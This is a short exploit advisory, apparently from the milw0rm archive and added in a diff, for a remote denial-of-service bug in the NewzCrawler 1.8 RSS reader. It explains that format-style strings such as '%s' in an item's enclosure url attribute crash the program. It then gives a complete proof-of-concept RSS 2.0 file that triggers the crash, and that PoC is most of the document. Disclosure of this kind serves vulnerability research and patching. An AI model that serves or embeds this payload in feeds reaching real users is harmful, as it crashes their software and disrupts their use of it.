@@ -1,0 +1,28 @@
+﻿NewzCrawler 1.8 Remote Denial of Service
+Credits: gbr
+Tested on Windows XP SP2
+
+NewzCrawler 1.8 becomes usntable and begin crash when parsering the 'url' atribute of
+'enclosure' sub-element contends some invalid string* at time of show a new item of a 
+RSS 2.0 file.
+
+* '%s', '%Y', '%%', 'n,', and others.
+
+PoC:
+
+<?xml version="1.0"?>
+<rss version="2.0">
+
+<channel>
+        <title>Test</title>
+        <link></link>
+        <description></description>
+
+        <item>
+                <title>Remote DoS PoC</title>
+                <enclosure url="%s"/>
+        </item>
+</channel>
+</rss>
+
+# milw0rm.com [2007-05-15]
